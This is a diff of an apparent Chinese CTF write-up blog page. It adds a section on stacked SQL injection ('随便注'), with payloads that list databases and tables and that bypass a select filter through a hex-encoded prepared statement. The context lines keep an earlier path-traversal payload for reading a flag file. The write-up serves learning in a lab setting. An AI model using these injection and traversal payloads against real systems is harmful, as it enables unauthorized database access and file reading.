@@ -60,7 +60,10 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7148.JPG">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7149.JPG">
-<meta property="og:updated_time" content="2020-02-04T06:00:26.357Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7157.JPG">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7158.JPG">
+<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7159.JPG">
+<meta property="og:updated_time" content="2020-02-19T13:59:28.593Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7148.JPG">
 
@@ -229,10 +232,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-02-04 09:30:51 / 修改时间：14:00:26" itemprop="dateCreated datePublished" datetime="2020-02-04T09:30:51+08:00">2020-02-04</time>
+              <time title="创建时间：2020-02-04 09:30:51" itemprop="dateCreated datePublished" datetime="2020-02-04T09:30:51+08:00">2020-02-04</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-19 21:59:28" itemprop="dateModified" datetime="2020-02-19T21:59:28+08:00">2020-02-19</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -265,6 +274,13 @@
 <p>这里%25解码为%，所以一开始浏览器会对其进行一次解码，变成source.php%3f，%3f解码之后是？，所以再一次解码后变为source.php?，顺利通关，但是我们目的是读取ffffllllaaaagggg，所以可以利用目录穿越<br>../../../../../../../../进行读取，最终payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253f/../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7149.JPG" alt="picture"><br>成功拿到flag</p>
+<p>0x02 随便注<br>这道题的考点应该是堆叠注入，首先列出数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show database;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7157.JPG" alt="picture"><br>之后列出表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show tables;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7158.JPG" alt="picture"><br>猜测flag在表一，但测试发现select是被过滤的。于是想到可以用16进制编码，还有prepare语句，即预编译语句，先prepare语句准备好一个SQL语句，并给他命名，之后调用这个名字即可<br>于是，有了如下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7159.JPG" alt="picture"></p>
 
     </div>
 
